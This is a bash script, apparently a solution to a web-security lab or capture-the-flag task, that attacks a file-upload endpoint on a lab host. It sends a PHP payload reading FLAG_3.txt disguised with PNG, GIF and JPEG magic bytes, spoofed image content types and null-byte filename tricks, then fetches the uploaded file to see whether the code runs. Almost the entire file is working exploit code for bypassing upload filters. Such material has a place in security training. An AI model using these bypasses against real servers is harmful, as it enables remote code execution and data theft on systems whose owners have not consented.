#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1
clear
H='Host: test-s3.web0x05.hbtn'
B='http://web0x05.hbtn'
URL="$B/api/task3/"
PHP='<?php readfile('"'"'FLAG_3.txt'"'"') ?>'
BND='----sep789'

# $1 label ; $2 filename (printf %b) ; $3 = prefixe magique (printf %b) ; $4 content-type
try() {
  local label="$1" fn="$2" magic="$3" ct="$4"
  local body=/tmp/b3.bin
  {
    printf -- "--%s\r\n" "$BND"
    printf 'Content-Disposition: form-data; name="file"; filename="'
    printf '%b' "$fn"
    printf '"\r\n'
    printf 'Content-Type: %s\r\n\r\n' "$ct"
    printf '%b' "$magic"
    printf '%s\r\n' "$PHP"
    printf -- "--%s--\r\n" "$BND"
  } > "$body"
  local resp path out
  resp=$(curl -s -H "$H" -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$body" "$URL")
  echo "[$label] -> $resp"
  path=$(echo "$resp" | grep -oE "/static/[^']*" | head -1)
  if [ -n "$path" ]; then
    out=$(curl -s -H "$H" "$B$path" | head -c 120)
    echo "        fetch $path => $out"
  fi
}

#        label                 filename            magic              content-type
try "php nu, sans magic"      'p3.php'            ''                 'image/png'
try "png magic, nom .php"     'p3.php'            '\x89PNG\r\n\x1a\n' 'image/png'
try "GIF magic, nom .php"     'p3.php'            'GIF89a;'          'image/png'
try "JPEG magic, nom .php"    'p3.php'            '\xff\xd8\xff\xe0' 'image/png'
try "GIF magic + null .png"   'p3.php%00.png'     'GIF89a;'          'image/png'
try "PNG magic + null .png"   'p3b.php%00.png'    '\x89PNG\r\n\x1a\n' 'image/png'
